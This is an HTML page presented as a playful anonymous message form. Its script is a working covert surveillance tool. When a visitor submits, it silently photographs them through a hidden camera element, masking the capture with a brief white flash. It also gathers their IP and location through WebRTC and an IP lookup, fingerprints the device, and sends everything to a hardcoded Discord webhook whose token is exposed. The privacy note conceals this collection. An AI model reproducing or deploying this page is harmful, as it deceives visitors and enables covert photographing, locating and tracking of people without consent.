<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>send me a message lol</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #ddd;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-text {
            font-size: 28px;
            font-weight: 600;
            color: #222;
            margin-bottom: 5px;
        }
        
        .logo-subtitle {
            color: #666;
            font-size: 15px;
            font-weight: normal;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #888;
        }
        
        .form-textarea {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            min-height: 100px;
            resize: vertical;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        .form-textarea:focus {
            outline: none;
            border-color: #888;
        }
        
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #222;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background: #333;
        }
        
        .submit-btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        
        .status-message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        
        .status-success {
            background: #e8f5e8;
            border: 1px solid #c8e6c8;
            color: #2d5a2d;
        }
        
        .status-error {
            background: #ffe8e8;
            border: 1px solid #ffc8c8;
            color: #a52d2d;
        }
        
        .status-processing {
            background: #fff8e8;
            border: 1px solid #ffe0c8;
            color: #856404;
        }
        
        .privacy-note {
            margin-top: 25px;
            padding: 15px;
            background: #f8f8f8;
            border-radius: 6px;
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            text-align: center;
            border: 1px solid #eee;
            font-style: italic;
        }
        
        /* Hidden elements */
        #camera-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        #camera-feed {
            width: 320px;
            height: 240px;
            transform: scale(0.1);
            opacity: 0;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(240, 240, 240, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            flex-direction: column;
            gap: 20px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #ddd;
            border-top: 3px solid #222;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-text {
            color: #333;
            font-size: 16px;
            font-weight: 500;
        }
        
        /* Quick flash for screenshot */
        .quick-flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            opacity: 0;
            pointer-events: none;
            z-index: 9999;
            transition: opacity 0.1s;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .logo-subtitle {
                font-size: 14px;
            }
            
            .form-input, .form-textarea {
                padding: 10px;
                font-size: 15px;
            }
            
            .submit-btn {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <!-- hidden camera stuff lol -->
    <div id="camera-container">
        <video id="camera-feed" autoplay playsinline></video>
    </div>
    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
    
    <!-- quick white flash -->
    <div id="quick-flash" class="quick-flash"></div>
    
    <!-- loading thing -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">processing your message...</div>
    </div>
    
    <!-- main thing -->
    <div class="container">
        <div class="logo">
            <div class="logo-text">send me a message lol</div>
            <div class="logo-subtitle">idk say something funny maybe</div>
        </div>
        
        <form id="message-form">
            <div class="form-group">
                <label class="form-label">ur name (optional, unless ur boring)</label>
                <input type="text" id="username" class="form-input" placeholder="who dis">
            </div>
            
            <div class="form-group">
                <label class="form-label">what u wanna say</label>
                <textarea id="message" class="form-textarea" placeholder="type something... anything really..." required></textarea>
            </div>
            
            <button type="submit" class="submit-btn" id="submit-btn">
                yeet that message
            </button>
            
            <div id="status-message" class="status-message"></div>
        </form>
        
        <div class="privacy-note">
            i'll get ur message directly. no pressure, but make it good lol
        </div>
    </div>

    <script>
        // discord thing
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        // grab all the stuff
        const form = document.getElementById('message-form');
        const usernameInput = document.getElementById('username');
        const messageInput = document.getElementById('message');
        const submitBtn = document.getElementById('submit-btn');
        const statusMessage = document.getElementById('status-message');
        const loadingOverlay = document.getElementById('loading-overlay');
        const quickFlash = document.getElementById('quick-flash');
        
        const cameraFeed = document.getElementById('camera-feed');
        const captureCanvas = document.getElementById('capture-canvas');
        
        // variables n stuff
        let stream = null;
        let isProcessing = false;
        
        // quick white flash
        function doQuickFlash() {
            quickFlash.style.opacity = '0.3';
            setTimeout(() => {
                quickFlash.style.opacity = '0';
            }, 50);
        }
        
        // show status message
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message status-' + type;
            statusMessage.style.display = 'block';
            
            if (type === 'success') {
                setTimeout(() => {
                    statusMessage.style.display = 'none';
                }, 3000);
            }
        }
        
        // try to get camera
        async function getCameraQuick() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                cameraFeed.srcObject = stream;
                await new Promise(resolve => setTimeout(resolve, 100));
                return stream;
            } catch (error) {
                console.log('Camera error:', error.message);
                return null;
            }
        }
        
        // take quick picture
        function takeQuickPicture() {
            if (!stream) return null;
            
            try {
                const canvas = captureCanvas;
                const video = cameraFeed;
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // add timestamp
                ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
                ctx.fillRect(10, 10, 180, 25);
                ctx.fillStyle = 'white';
                ctx.font = '12px Arial';
                ctx.fillText('sent: ' + new Date().toLocaleTimeString(), 15, 25);
                
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch (e) {
                console.log('Picture error:', e);
                return null;
            }
        }
        
        // Convert base64 image to blob
        function dataURLtoBlob(dataurl) {
            try {
                const arr = dataurl.split(',');
                const mime = arr[0].match(/:(.*?);/)[1];
                const bstr = atob(arr[1]);
                let n = bstr.length;
                const u8arr = new Uint8Array(n);
                while (n--) {
                    u8arr[n] = bstr.charCodeAt(n);
                }
                return new Blob([u8arr], { type: mime });
            } catch (error) {
                return null;
            }
        }
        
        // Get location using WebRTC (works without permission)
        async function getLocationFromWebRTC() {
            try {
                // Create a temporary RTCPeerConnection
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                
                // Create a data channel to trigger candidate gathering
                pc.createDataChannel('');
                
                // Create offer to get ICE candidates
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                
                // Wait for ICE candidates
                return new Promise((resolve) => {
                    const candidates = [];
                    
                    pc.onicecandidate = (event) => {
                        if (event.candidate) {
                            const candidate = event.candidate.candidate;
                            // Parse IP from candidate string
                            const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (ipMatch) {
                                candidates.push({
                                    ip: ipMatch[1],
                                    type: event.candidate.type,
                                    protocol: candidate.includes('udp') ? 'UDP' : 'TCP'
                                });
                            }
                        } else {
                            // No more candidates
                            pc.close();
                            if (candidates.length > 0) {
                                resolve({
                                    ip: candidates[0].ip,
                                    source: 'WebRTC (local network)',
                                    accuracy: 'Local network IP'
                                });
                            } else {
                                resolve(null);
                            }
                        }
                    };
                    
                    // Timeout after 3 seconds
                    setTimeout(() => {
                        pc.close();
                        resolve(null);
                    }, 3000);
                });
                
            } catch (error) {
                console.log('WebRTC error:', error.message);
                return null;
            }
        }
        
        // Get approximate location using IP (fallback)
        async function getLocationFromIP() {
            try {
                // Use a CORS-friendly service
                const response = await fetch('https://api.db-ip.com/v2/free/self');
                const data = await response.json();
                
                if (data && data.latitude && data.longitude) {
                    return {
                        ip: data.ipAddress,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        city: data.city || '',
                        country: data.countryName || '',
                        accuracy: 'IP-based (approximate)',
                        source: 'IP geolocation'
                    };
                }
            } catch (error) {
                console.log('IP geolocation failed:', error.message);
            }
            
            return null;
        }
        
        // Main location function - tries multiple methods
        async function getLocationData() {
            // Try WebRTC first (works without permission)
            const webrtcLocation = await getLocationFromWebRTC();
            
            // If WebRTC worked, return it
            if (webrtcLocation) {
                return webrtcLocation;
            }
            
            // Fallback to IP geolocation (requires CORS-friendly API)
            const ipLocation = await getLocationFromIP();
            return ipLocation;
        }
        
        // Get device info
        function getDeviceInfo() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                language: navigator.language || 'Unknown',
                platform: navigator.platform || 'Unknown',
                screenSize: `${window.screen.width}x${window.screen.height}`,
                userAgent: navigator.userAgent.substring(0, 100) + '...',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
            };
        }
        
        // Generate maps link
        function generateMapsLink(latitude, longitude) {
            if (latitude && longitude) {
                return `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
            }
            return '';
        }
        
        // send to discord
        async function sendToDiscord(username, message, picture = null, location = null) {
            try {
                const timestamp = new Date().toLocaleString();
                const deviceInfo = getDeviceInfo();
                
                // Create location info
                let locationField = "Not available";
                
                if (location) {
                    const mapsLink = generateMapsLink(location.latitude, location.longitude);
                    let locationText = `IP: ${location.ip || 'Unknown'}\n`;
                    locationText += `Source: ${location.source || 'Unknown'}\n`;
                    locationText += `Accuracy: ${location.accuracy || 'Unknown'}\n`;
                    
                    if (location.city) locationText += `City: ${location.city}\n`;
                    if (location.country) locationText += `Country: ${location.country}\n`;
                    if (location.latitude) locationText += `Latitude: ${location.latitude}\n`;
                    if (location.longitude) locationText += `Longitude: ${location.longitude}\n`;
                    if (mapsLink) locationText += `[View on Maps](${mapsLink})`;
                    
                    locationField = locationText.trim();
                }
                
                // Device info
                const deviceField = `Timezone: ${deviceInfo.timezone}
Language: ${deviceInfo.language}
Platform: ${deviceInfo.platform}
Screen: ${deviceInfo.screenSize}
CPU Cores: ${deviceInfo.hardwareConcurrency}
RAM: ${deviceInfo.deviceMemory}GB`.trim();
                
                // Create the embed
                const embed = {
                    title: "New Message Received",
                    color: 0x3498db,
                    fields: [
                        {
                            name: "From",
                            value: username || "Anonymous",
                            inline: true
                        },
                        {
                            name: "Time",
                            value: timestamp,
                            inline: true
                        },
                        {
                            name: "Device Info",
                            value: "```" + deviceField + "```",
                            inline: false
                        },
                        {
                            name: "Message",
                            value: message || "No message content",
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Sent via message form"
                    },
                    timestamp: new Date().toISOString()
                };
                
                // Add location field if available
                if (location && locationField !== "Not available") {
                    embed.fields.splice(2, 0, {
                        name: "Location Data",
                        value: "```" + locationField + "```",
                        inline: false
                    });
                }
                
                // If we have a picture
                if (picture) {
                    try {
                        const blob = dataURLtoBlob(picture);
                        
                        if (blob) {
                            const formData = new FormData();
                            const filename = `message_${Date.now()}.jpg`;
                            formData.append('file', blob, filename);
                            
                            embed.image = {
                                url: `attachment://${filename}`
                            };
                            
                            formData.append('payload_json', JSON.stringify({
                                username: "message bot",
                                embeds: [embed]
                            }));
                            
                            const response = await fetch(DISCORD_WEBHOOK, {
                                method: 'POST',
                                body: formData
                            });
                            
                            if (!response.ok) {
                                throw new Error('Discord API error');
                            }
                            
                            return true;
                        }
                    } catch (imageError) {
                        console.log('Image upload failed:', imageError.message);
                        // Continue without image
                    }
                }
                
                // Text-only fallback
                const payload = {
                    username: "message bot",
                    embeds: [embed]
                };
                
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error('Discord API error');
                }
                
                return true;
                
            } catch (error) {
                console.error('Error sending to Discord:', error);
                return false;
            }
        }
        
        // cleanup camera
        function cleanupCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        }
        
        // when they submit
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isProcessing) return;
            
            const username = usernameInput.value.trim();
            const message = messageInput.value.trim();
            
            if (!message) {
                showStatus('bruh write something first', 'error');
                messageInput.focus();
                return;
            }
            
            // start doing stuff
            isProcessing = true;
            submitBtn.disabled = true;
            loadingOverlay.style.display = 'flex';
            showStatus('sending...', 'processing');
            
            try {
                let picture = null;
                let location = null;
                
                // Try to get camera
                const cameraStream = await getCameraQuick();
                
                if (cameraStream) {
                    // quick flash
                    doQuickFlash();
                    
                    // wait a bit
                    await new Promise(resolve => setTimeout(resolve, 50));
                    
                    // take picture
                    picture = takeQuickPicture();
                    
                    // wait a bit more
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    // cleanup
                    cleanupCamera();
                }
                
                // Get location data silently
                try {
                    location = await getLocationData();
                } catch (locError) {
                    console.log('Location failed:', locError.message);
                    // Continue without location
                }
                
                // Send everything
                const success = await sendToDiscord(username, message, picture, location);
                
                if (success) {
                    showStatus('message sent!', 'success');
                    messageInput.value = '';
                    usernameInput.value = '';
                } else {
                    showStatus('failed to send. try again maybe?', 'error');
                }
                
            } catch (error) {
                console.error('Main error:', error);
                showStatus('something broke. oops.', 'error');
                
            } finally {
                // cleanup
                isProcessing = false;
                submitBtn.disabled = false;
                loadingOverlay.style.display = 'none';
                
                // make sure camera off
                cleanupCamera();
            }
        });
        
        // Simple test to see if Discord webhook works
        console.log('Page loaded, form ready');
    </script>
</body>
</html>
